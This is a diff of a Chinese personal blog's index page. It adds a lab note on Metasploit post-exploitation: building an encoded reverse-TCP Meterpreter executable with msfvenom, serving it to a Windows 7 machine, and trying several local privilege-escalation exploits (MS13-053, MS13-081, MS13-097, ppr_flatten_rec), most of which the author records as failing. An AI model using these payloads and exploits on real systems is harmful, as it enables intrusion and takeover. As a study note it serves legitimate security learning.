@@ -240,6 +240,300 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%85%AD)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%85%AD)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/" itemprop="url">Kali Linux笔记(一百零六)：MSF后渗透测试--漏洞提权</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-03T15:22:25+08:00">
+                2020-03-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  509 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-Msf后渗透测试阶段"><a href="#1-Msf后渗透测试阶段" class="headerlink" title="1. Msf后渗透测试阶段"></a>1. Msf后渗透测试阶段</h4><ul>
+<li>已经获得目标系统控制权后扩大战果<ul>
+<li>提权</li>
+<li>信息收集</li>
+<li>渗透内网</li>
+<li>永久后门</li>
+</ul>
+</li>
+<li>实验环境<ul>
+<li>Window 7<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li>关闭防火墙</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-基于已有session扩大战果"><a href="#2-基于已有session扩大战果" class="headerlink" title="2. 基于已有session扩大战果"></a>2. 基于已有session扩大战果</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 7 -f exe -o 1.exe</code></strong></li>
+<li><strong><code>🔺命令：service apache2 start</code></strong></li>
+<li><strong><code>🔺命令：cp 1.exe /var/www/html</code></strong></li>
+<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
+<li><strong><code>🔺命令：use exploit/multi/handler</code></strong><ul>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong></li>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window 7<ul>
+<li>浏览器访问<a href="http://Kali的IP，下载保存1.exe" target="_blank" rel="noopener">http://Kali的IP，下载保存1.exe</a></li>
+<li>双击打开1.exe</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>查看是否拿到shell</li>
+<li><strong><code>🔺命令：session -l</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="3-获取system账号权限"><a href="#3-获取system账号权限" class="headerlink" title="3. 获取system账号权限"></a>3. 获取system账号权限</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：load priv</code></strong> </li>
+<li><strong><code>🔺命令：getsystem</code></strong> <ul>
+<li>priv_elevate_getsystem: Operation failed: Access is denied. </li>
+<li>priv_elevate_getsystem: Operation failed: The enviroment is incorrect.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-利用漏洞直接提权为system-1"><a href="#4-利用漏洞直接提权为system-1" class="headerlink" title="4. 利用漏洞直接提权为system-1"></a>4. 利用漏洞直接提权为system-1</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：use exploit/windows/local/ms13_053_schlamperei</code></strong><ul>
+<li><strong><code>🔺命令：set session 1</code></strong></li>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
+<li>▲ 2020.03.02 Running against 64-bit systems is not supported，32位系统暂无实验</li>
+</ul>
+</li>
+</ul>
+<h4 id="5-利用漏洞直接提权为system-2"><a href="#5-利用漏洞直接提权为system-2" class="headerlink" title="5. 利用漏洞直接提权为system-2"></a>5. 利用漏洞直接提权为system-2</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：use exploit/windows/local/ms13_081_track_popup_menu</code></strong><ul>
+<li><strong><code>🔺命令：set session 1</code></strong></li>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
+<li>▲ 2020.03.02 Running against 64-bit systems is not supported，32位系统暂无实验</li>
+</ul>
+</li>
+</ul>
+<h4 id="6-利用漏洞直接提权为system-3"><a href="#6-利用漏洞直接提权为system-3" class="headerlink" title="6. 利用漏洞直接提权为system-3"></a>6. 利用漏洞直接提权为system-3</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：use exploit/windows/local/ms13_097_ie_registry_symlink</code></strong><ul>
+<li><strong><code>🔺命令：set session 1</code></strong></li>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
+<li>▲ 2020.03.02 Not-vulnerable;Not running inside an Internet Explorer process</li>
+</ul>
+</li>
+</ul>
+<h4 id="7-利用漏洞直接提权为system-4"><a href="#7-利用漏洞直接提权为system-4" class="headerlink" title="7. 利用漏洞直接提权为system-4"></a>7. 利用漏洞直接提权为system-4</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：use exploit/windows/local/ppr_flatten_rec</code></strong> <ul>
+<li><strong><code>🔺命令：set session 1</code></strong></li>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
+<li>▲ 2020.03.02 Running against 64-bit systems is not supported，32位系统暂无实验</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/02/IPS%E7%AC%94%E8%AE%B0-1%EF%BC%9AIPS%E5%9F%BA%E7%A1%80/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -3424,184 +3718,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/20/Git%E7%AC%94%E8%AE%B0-9%EF%BC%9AGit%E5%B8%B8%E7%94%A8%E5%9B%BE%E5%BD%A2%E5%8C%96%E5%B7%A5%E5%85%B7/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/20/Git%E7%AC%94%E8%AE%B0-9%EF%BC%9AGit%E5%B8%B8%E7%94%A8%E5%9B%BE%E5%BD%A2%E5%8C%96%E5%B7%A5%E5%85%B7/" itemprop="url">Git笔记-9：Git常用图形化工具</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-20T16:24:49+08:00">
-                2020-02-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Git/" itemprop="url" rel="index">
-                    <span itemprop="name">Git</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  14 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-常用工具"><a href="#1-常用工具" class="headerlink" title="1. 常用工具"></a>1. 常用工具</h4><ul>
-<li>sourcetree</li>
-<li>vscode</li>
-<li>git图标：<a href="https://gitmoji.surge.sh" target="_blank" rel="noopener">https://gitmoji.surge.sh</a></li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3656,7 +3772,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">163</span>
+                  <span class="site-state-item-count">164</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3763,7 +3879,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">149k</span>
+    <span title="Site words total count">149.4k</span>
   
 </div>
 
